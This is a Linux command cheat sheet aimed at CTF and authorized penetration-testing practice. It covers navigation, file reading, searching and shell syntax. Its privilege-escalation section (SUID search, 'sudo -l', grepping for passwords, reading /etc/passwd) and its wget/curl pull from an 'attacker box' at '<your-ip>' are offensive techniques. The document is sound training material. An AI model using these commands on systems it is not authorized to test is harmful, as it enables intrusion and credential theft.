# Linux Command Cheat Sheet

> ⚠️ **Disclaimer — read first.**
> For **education and authorized testing only**. Run commands only on systems you own or
> have **written permission** to test, or on training platforms. **Use at your own risk
> and responsibility.** The author assumes no liability for misuse.

The commands I actually reach for — navigation, reading files, searching, and the
post-exploitation / privesc basics. Fluency comes from reps, not memorizing; keep this handy.

---

## Navigation & orientation

| Command | What it does |
|---|---|
| `pwd` | Where am I (print working directory) |
| `ls -la` | List all files incl. hidden (`.`) + permissions |
| `cd <dir>` | Change directory (`cd ..` up, `cd ~` home, `cd -` back) |
| `whoami` | Current user |
| `id` | User + groups (useful for privesc) |
| `hostname` | Machine name |
| `uname -a` | Kernel / OS info |

## Reading files (and what to do when `cat` is blocked)

| Command | Notes |
|---|---|
| `cat <file>` | Dump a whole file. **Often blocked in CTFs** |
| `less <file>` | Page through (q to quit) — great `cat` alternative |
| `more <file>` | Simpler pager |
| `head <file>` / `tail <file>` | First / last 10 lines (`-n N` for N lines) |
| `nl <file>` | Print with line numbers |
| `strings <file>` | Printable text from a binary |
| `grep . <file>` | Abuse grep to print a file line by line |

> **Blocking one read command is useless** — many others read files. If `cat` fails, try
> `less`, `more`, `head`, `nl`, `grep`.

## Spaces & special characters in filenames

A space splits a command into separate arguments. `cat second ingredients` looks for **two**
files. Fix it:
```bash
cat "second ingredients"     # quote the whole name
cat second\ ingredients      # or escape the space with \
```
Same idea for other special chars (`(`, `)`, `&`, `'`): quote or escape.

## Searching

| Command | What it does |
|---|---|
| `find / -name "*.txt" 2>/dev/null` | Find files by name (silence errors) |
| `find / -type f -perm -4000 2>/dev/null` | Find SUID binaries (privesc) |
| `grep -r "password" /path 2>/dev/null` | Recursively search file contents |
| `locate <name>` | Fast search (if the db exists) |
| `which <cmd>` / `whereis <cmd>` | Where a program lives |

## Permissions & privilege escalation (first checks)

| Command | What it does |
|---|---|
| `sudo -l` | **First privesc check** — what can I run as root? Look for `NOPASSWD` |
| `sudo <cmd>` | Run a command as root (reads root-only files if allowed) |
| `sudo su` / `sudo -i` | Become root (if permitted) |
| `ls -la /home` `/root` | User homes & admin home — where secrets live |
| `cat /etc/passwd` | User accounts on the box |
| `ls -la <file>` | Check a file's owner/permissions |

> `sudo -l` showing `(ALL) NOPASSWD: ALL` = you can run **anything** as root without a
> password — a classic misconfiguration, and the fastest privesc there is.

## Transferring files (when you really need to move one)

```bash
# On your attacker box: serve the current folder
python3 -m http.server 8000

# On the target: pull a file from you
wget http://<your-ip>:8000/file
curl http://<your-ip>:8000/file -o file
```
> In a command-panel / RCE scenario you usually **read files in place** instead of
> downloading them — simpler, and no transfer needed.

## Processes, network, services

| Command | What it does |
|---|---|
| `ps aux` | Running processes |
| `netstat -tulpn` / `ss -tulpn` | Listening ports/services |
| `ip a` / `ifconfig` | Network interfaces |
| `ip route` | Routing / default gateway |

## Handy shell bits

| Thing | Meaning |
|---|---|
| `cmd1 ; cmd2` | Run both, in order |
| `cmd1 && cmd2` | Run cmd2 only if cmd1 succeeded |
| `cmd > file` / `>> file` | Redirect output (overwrite / append) |
| `cmd1 \| cmd2` | Pipe cmd1's output into cmd2 |
| `2>/dev/null` | Throw away error messages |
| `history` | Commands you've run |
| `man <cmd>` / `<cmd> --help` | The manual — look it up instead of memorizing |

---

*Reference maintained for my own learning. Authorized targets / training only.*
